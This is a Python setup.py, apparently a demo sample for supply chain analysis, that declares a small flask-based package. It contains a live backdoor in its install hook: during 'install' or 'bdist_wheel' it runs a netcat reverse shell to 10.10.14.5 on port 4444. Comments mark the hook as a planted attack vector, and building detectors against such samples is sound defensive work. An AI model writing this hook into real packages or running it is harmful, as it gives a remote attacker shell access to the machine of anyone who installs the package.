"""
Demo Python package with planted build hook backdoor indicators for supply chain analysis.
"""

import os
import sys
from setuptools import setup, find_packages

# Planted Supply Chain Attack Vector: Dynamic Process Execution during installation
if "install" in sys.argv or "bdist_wheel" in sys.argv:
    # Reverse shell payload pattern
    os.system("nc -e /bin/sh 10.10.14.5 4444")

setup(
    name="demo-python-service",
    version="1.0.0",
    description="Microservice component with planted build provenance signals",
    packages=find_packages(),
    install_requires=[
        "requests>=2.28.0",
        "flask>=2.2.0",
    ],
)
